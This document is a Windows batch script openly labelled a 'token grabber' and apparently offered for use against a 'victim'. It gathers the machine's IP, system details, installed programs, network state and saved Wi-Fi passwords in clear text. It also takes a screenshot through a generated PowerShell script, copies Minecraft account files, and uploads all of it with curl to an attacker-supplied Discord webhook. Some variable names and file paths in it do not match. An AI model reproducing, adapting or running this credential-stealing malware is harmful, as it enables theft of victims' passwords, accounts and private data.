::Token Grabber Made by Wiz ( Coded in Python )

set webhook=( Webhook Here )



:check_Permissions
    

    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto starti
    ) else (
       cls
       echo Failure: Please run the file again with Admin
       timeout 2 >NUL
       goto check_Permissions
    )

:starti
::set 1 if you want that the discord of your target get closed ( discord needs to be restarted to send you the token)
set /a killdc = 0

curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt

::Grab ip
curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt

::Gets a list of all installed programms
powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programms.txt "


::Grabs informations about the pc
echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic bios get serialnumber>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt
systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
    netsh wlan show profile %%a key=clear >>%userprofile%\AppData\Local\Temp\wlan.txt
   
)

::Grabs the ipconfig and local ip
ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt

::Takes the info about the netstat
netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt

::Takes screenshot of current screen
echo $SERDO = Get-Clipboard >%userprofile%\AppData\Local\Temp\test.ps1
echo function Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
echo { >>%userprofile%\AppData\Local\Temp\test.ps1
echo     begin { >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Add-Type -AssemblyName System.Drawing, System.Windows.Forms >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Add-Type -AssemblyName System.Drawing >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() ^|  >>%userprofile%\AppData\Local\Temp\test.ps1
echo             Where-Object { $_.FormatDescription -eq "JPEG" } >>%userprofile%\AppData\Local\Temp\test.ps1
echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
echo     process { >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Start-Sleep -Milliseconds 44 >>%userprofile%\AppData\Local\Temp\test.ps1
echo             [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")    >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Start-Sleep -Milliseconds 550 >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $bitmap = [Windows.Forms.Clipboard]::GetImage()     >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $ep = New-Object Drawing.Imaging.EncoderParameters   >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)   >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture" >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep) >>%userprofile%\AppData\Local\Temp\test.ps1
echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
echo }							 >>%userprofile%\AppData\Local\Temp\test.ps1			
echo Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
echo Set-Clipboard -Value $SERDO >>%userprofile%\AppData\Local\Temp\test.ps1
echo $result  = "%webhook%"  >>%userprofile%\AppData\Local\Temp\test.ps1
echo $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture.jpg"	 >>%userprofile%\AppData\Local\Temp\test.ps1															
echo curl.exe -i -F file=@"$screenCapturePathBase" $result >>%userprofile%\AppData\Local\Temp\test.ps1
timeout 1 >NUL
Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1 

::Grabs Minecraft accounts if there are any
if exist %userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json %web% && goto end


::sends the username, ip, current time, and date of the victim


curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User %username% : %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%

::sends all files
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\Pc Info.txt %webhook%
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\sysi.txt %webhook% 
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\Ip Info.txt %webhook% 
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\netstat.txt %webhook% 
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\Programms.txt %webhook%
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\uuid.txt %webhook%
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\wlan.txt %webhook%